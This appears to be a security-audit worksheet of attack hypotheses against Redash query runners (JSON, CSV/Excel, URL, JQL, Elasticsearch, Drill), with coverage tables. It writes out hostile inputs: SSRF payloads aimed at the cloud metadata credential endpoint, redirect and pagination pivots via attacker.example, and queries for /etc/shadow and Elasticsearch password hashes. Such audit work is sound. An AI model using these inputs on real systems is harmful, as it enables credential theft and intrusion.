# Round 1 Hypotheses — URL-loading query runners and HTTP data sources

## PH-01: Cloud metadata credential exfiltration via JSON URL fetch (SSRF guard disabled)

- **Reasoning-Model**: Pre-Mortem
- **Target**: `redash/query_runner/json_ds.py:157` — `JSON.run_query`
- **Attacker starting position**: authenticated-user (can execute JSON data source queries)
- **Attack input**: YAML query
  ```yaml
  url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  method: "get"
  fields: ["roleName", "AccessKeyId", "SecretAccessKey", "Token"]
  ```
- **Chain**: attacker executes JSON data source query → runner forwards URL to HTTP client without allowlist → with `ENFORCE_PRIVATE_ADDRESS_BLOCK` disabled, request reaches metadata service → response is parsed and returned to user
- **Catastrophe / Dangerous fallback**: cloud instance credentials exfiltration enabling cross-account access and lateral movement
- **Severity estimate**: CRITICAL
- **Read needed**: anatomy sufficient
- **Deepening direction**: verify how `requests_or_advocate` behaves when `ENFORCE_PRIVATE_ADDRESS_BLOCK` is false; check if metadata IP is reachable from worker network

---

## PH-02: Response-controlled pagination pivots to internal host (next_url SSRF)

- **Reasoning-Model**: Pre-Mortem + Abductive
- **Target**: `redash/query_runner/json_ds.py:200` — `JSON._get_all_results`
- **Attacker starting position**: authenticated-user (can execute JSON data source queries)
- **Attack input**: YAML query
  ```yaml
  url: "https://attacker.example/api/list"
  method: "get"
  pagination:
    type: "url"
    path: "next"
  fields: []
  ```
  Attacker-controlled response body: `{ "next": "http://169.254.169.254/latest/meta-data/" }`
- **Chain**: attacker points initial request at attacker server → server returns `next_url` pointing to internal host → pagination logic `urljoin` accepts host swap → follow-up request hits internal host and returns sensitive data
- **Catastrophe / Dangerous fallback**: internal service or metadata data exfiltration via response-driven pivot
- **Severity estimate**: HIGH
- **Read needed**: anatomy sufficient
- **Deepening direction**: confirm whether `UrlPagination.next` permits absolute URLs and whether any host allowlist is enforced downstream

---

## PH-03: CSV/Excel runners follow open redirects to internal resources

- **Reasoning-Model**: Pre-Mortem + Abductive
- **Target**: `redash/query_runner/csv.py:48` — `CSV.run_query`
- **Attacker starting position**: authenticated-user (can execute CSV/Excel data source queries)
- **Attack input**: YAML query
  ```yaml
  url: "http://attacker.example/redirect?to=http://10.0.0.5:8080/internal/report.csv"
  user-agent: "redash-probe"
  ```
- **Chain**: attacker supplies URL that 302-redirects to internal CSV/XLSX resource → `requests_or_advocate.get` follows redirects (no `ConfiguredSession` redirect policy) → internal resource downloaded and parsed → data returned to attacker
- **Catastrophe / Dangerous fallback**: exfiltration of internal reports or sensitive CSV/Excel exports via redirect SSRF
- **Severity estimate**: HIGH
- **Read needed**: anatomy sufficient
- **Deepening direction**: inspect default redirect behavior for `requests_or_advocate.get` and whether it re-validates redirect targets

---

## PH-04: URL query runner allows arbitrary absolute URLs when base_url is unset

- **Reasoning-Model**: Pre-Mortem + Abductive
- **Target**: `redash/query_runner/url.py:12` — `Url.run_query`
- **Attacker starting position**: authenticated-user (can execute URL data source queries)
- **Attack input**: query string
  ```
  http://10.0.0.5:2375/containers/json
  ```
- **Chain**: attacker submits absolute URL → runner accepts it because no base_url restriction applies → HTTP client requests internal Docker API → response returned to attacker
- **Catastrophe / Dangerous fallback**: exposure of internal container inventory enabling follow-on container compromise
- **Severity estimate**: HIGH
- **Read needed**: anatomy sufficient
- **Deepening direction**: confirm whether any upstream policy restricts URL data source usage to specific users or tenants

---

## PH-05: JQL runner used as an internal API proxy when base URL misconfigured

- **Reasoning-Model**: Pre-Mortem
- **Target**: `redash/query_runner/jql.py:168` — `JiraJQL.run_query`
- **Attacker starting position**: authenticated-user (access to Jira data source)
- **Attack input**: JSON query
  ```json
  {"jql":"project=SECRET order by created DESC","fields":["summary","description","comment"],"maxResults":1000}
  ```
- **Chain**: data source base URL accidentally points to internal search API → runner sends GET `/rest/api/2/search` with attacker-chosen params → internal service returns sensitive records → results returned to attacker
- **Catastrophe / Dangerous fallback**: data leak from internal services reachable only from worker network
- **Severity estimate**: HIGH
- **Read needed**: anatomy sufficient
- **Deepening direction**: check whether data source creation enforces URL allowlists or admin-only controls

---

## PH-06: Elasticsearch runner exposes system indices to untrusted query authors

- **Reasoning-Model**: Pre-Mortem
- **Target**: `redash/query_runner/elasticsearch2.py:59` — `ElasticSearch2.run_query`
- **Attacker starting position**: authenticated-user (access to Elasticsearch data source)
- **Attack input**: JSON query
  ```json
  {"index":".security","query":{"match_all":{}},"result_fields":["username","password_hash","roles"]}
  ```
- **Chain**: attacker submits query targeting protected system index → runner forwards index/path without validation → Elasticsearch returns security metadata → sensitive credentials/roles exposed to attacker
- **Catastrophe / Dangerous fallback**: credential/role exfiltration enabling cluster takeover or lateral access
- **Severity estimate**: HIGH
- **Read needed**: anatomy sufficient
- **Deepening direction**: confirm whether query runner limits index names or requires per-index permissions

---

## PH-07: Drill runner reads server-side files via filesystem storage plugin

- **Reasoning-Model**: Pre-Mortem
- **Target**: `redash/query_runner/drill.py:91` — `Drill.run_query`
- **Attacker starting position**: authenticated-user (access to Drill data source)
- **Attack input**: SQL query
  ```sql
  SELECT * FROM dfs.`/etc/shadow`;
  ```
- **Chain**: attacker submits SQL using Drill filesystem storage → runner sends query JSON unvalidated → Drill reads local filesystem → sensitive file contents returned in result set
- **Catastrophe / Dangerous fallback**: exposure of host secrets (password hashes, environment files) and expansion to full host compromise
- **Severity estimate**: CRITICAL
- **Read needed**: anatomy sufficient
- **Deepening direction**: identify which Drill storage plugins are enabled and what filesystem paths they can access

---

## Coverage Check

| Entry Point | Pre-Mortem covered? | Abductive covered? |
|------------|:-:|:-:|
| `redash/query_runner/url.py:12` — `Url.run_query` | PH-04 | PH-04 |
| `redash/query_runner/json_ds.py:157` — `JSON.run_query` | PH-01 | NO — defensive patterns do not add alternate path beyond SSRF guard state |
| `redash/query_runner/json_ds.py:200` — `JSON._get_all_results` | PH-02 | PH-02 |
| `redash/query_runner/json_ds.py:219` — `JSON._get_json_response` | PH-01 | NO — error handling only |
| `redash/query_runner/csv.py:48` — `CSV.run_query` | PH-03 | PH-03 |
| `redash/query_runner/excel.py:45` — `Excel.run_query` | PH-03 | PH-03 |
| `redash/query_runner/jql.py:168` — `JiraJQL.run_query` | PH-05 | NO — defensive patterns do not alter trust chain |
| `redash/query_runner/elasticsearch2.py:59` — `ElasticSearch2.run_query` | PH-06 | NO — no defensive fallback tied to query inputs |
| `redash/query_runner/drill.py:91` — `Drill.run_query` | PH-07 | NO — no defensive fallback tied to query inputs |
| `redash/query_runner/__init__.py:375` — `BaseHTTPQueryRunner.get_response` | PH-01 | NO — error handling only |
| `redash/utils/requests_session.py:19` — `ConfiguredSession.request` | PH-01 | PH-03 (redirect-control bypass context) |

| Defensive Pattern | Abductive hypothesis generated? |
|------------------|:-:|
| `redash/query_runner/__init__.py:205` null check (noop_query) | NO — raises NotImplementedError only |
| `redash/query_runner/__init__.py:209` error check | NO — raises Exception only |
| `redash/query_runner/__init__.py:234` null check | NO — no fallback behavior |
| `redash/query_runner/__init__.py:238` error handling | NO — raises Exception only |
| `redash/query_runner/__init__.py:244` error check | NO — raises Exception only |
| `redash/query_runner/__init__.py:292` length check | NO — returns False only |
| `redash/query_runner/__init__.py:297` validation | NO — returns False only |
| `redash/query_runner/__init__.py:371` required fields check | NO — auth failure stops request |
| `redash/query_runner/__init__.py:385` try/except request errors | NO — errors surfaced only |
| `redash/query_runner/__init__.py:392` status check | NO — errors surfaced only |
| `redash/query_runner/__init__.py:395` HTTPError handler | NO — errors surfaced only |
| `redash/query_runner/__init__.py:399` UnacceptableAddress handler | PH-01 — indicates SSRF guard reliance on settings |
| `redash/query_runner/__init__.py:402` RequestException handler | NO — errors surfaced only |
| `redash/query_runner/__init__.py:497` NotImplemented check (SSH) | NO — raises NotImplementedError only |
| `redash/query_runner/__init__.py:509` SSH tunnel try/except | NO — raises error only |
| `redash/query_runner/url.py:17` input restriction (relative URL) | PH-04 — suggests partial SSRF prevention when base_url set |
| `redash/query_runner/url.py:32` empty response check | NO — returns error only |
| `redash/query_runner/json_ds.py:26` empty query check | NO — raises QueryParseError only |
| `redash/query_runner/json_ds.py:28` YAML parse try/except | NO — raises QueryParseError only |
| `redash/query_runner/json_ds.py:74` fallback default for path | NO — returns default value only |
| `redash/query_runner/json_ds.py:77` missing path check | NO — raises Exception only |
| `redash/query_runner/json_ds.py:169` type check | NO — raises QueryParseError only |
| `redash/query_runner/json_ds.py:172` missing field check | NO — raises QueryParseError only |
| `redash/query_runner/json_ds.py:186` type coercion (auth list->tuple) | NO — neutral normalization |
| `redash/query_runner/json_ds.py:191` method restriction | NO — raises QueryParseError only |
| `redash/query_runner/json_ds.py:194` fields type check | NO — raises QueryParseError only |
| `redash/query_runner/json_ds.py:236` pagination config validation | NO — raises QueryParseError only |
| `redash/query_runner/json_ds.py:244` unknown pagination type | NO — raises QueryParseError only |
| `redash/query_runner/json_ds.py:250` pagination.path validation | NO — raises QueryParseError only |
| `redash/query_runner/json_ds.py:255` pagination stop (next_url falsy) | NO — stops pagination only |
| `redash/query_runner/json_ds.py:265` pagination fields validation | NO — raises QueryParseError only |
| `redash/query_runner/json_ds.py:270` pagination stop (next_token falsy) | NO — stops pagination only |
| `redash/query_runner/json_ds.py:276` infinite loop guard | NO — raises Exception only |
| `redash/query_runner/csv.py:52` YAML parse try/except defaults | NO — defaults cause error, no privilege gain |
| `redash/query_runner/csv.py:99` KeyboardInterrupt handler | NO — returns cancellation only |
| `redash/query_runner/csv.py:102` UnacceptableAddress handler | PH-01 — indicates SSRF guard reliance on settings |
| `redash/query_runner/csv.py:105` generic error handler | NO — returns error only |
| `redash/query_runner/excel.py:49` YAML parse try/except defaults | NO — defaults cause error, no privilege gain |
| `redash/query_runner/excel.py:97` KeyboardInterrupt handler | NO — returns cancellation only |
| `redash/query_runner/excel.py:100` UnacceptableAddress handler | PH-01 — indicates SSRF guard reliance on settings |
| `redash/query_runner/excel.py:103` generic error handler | NO — returns error only |
| `redash/query_runner/jql.py:39` fallback key field | NO — only affects output labeling |
| `redash/query_runner/jql.py:42` fallback fields | NO — uses empty dict only |
| `redash/query_runner/jql.py:106` fallback total | NO — affects count only |
| `redash/query_runner/jql.py:177` default JQL | NO — benign default query |
| `redash/query_runner/jql.py:200` pagination loop guard | NO — stops pagination only |
| `redash/query_runner/elasticsearch2.py:95` mapping fallback | NO — parsing fallback only |
| `redash/query_runner/elasticsearch2.py:209` error response check | NO — raises Exception only |
| `redash/query_runner/elasticsearch2.py:235` fallback error | NO — raises Exception only |
| `redash/query_runner/elasticsearch2.py:272` error response check | NO — raises Exception only |
| `redash/query_runner/drill.py:22` empty check | NO — returns empty string only |
| `redash/query_runner/drill.py:45` empty columns check | NO — returns empty result only |
| `redash/query_runner/drill.py:118` allowed_schemas sanitization | NO — sanitization only, no fallback |
| `redash/utils/requests_session.py:21` redirect control | PH-03 — indicates redirect risk mitigated in some paths only |

| Trust Chain Gap | Backward chain traced? |
|----------------|:-:|
| SSRF guard relies on ENFORCE_PRIVATE_ADDRESS_BLOCK | PH-01 |
| pagination next_url can redirect to different host | PH-02 |
| CSV/Excel use requests_or_advocate.get directly | PH-03 |
| no scheme/host allowlist in query runner parsing | PH-04 |
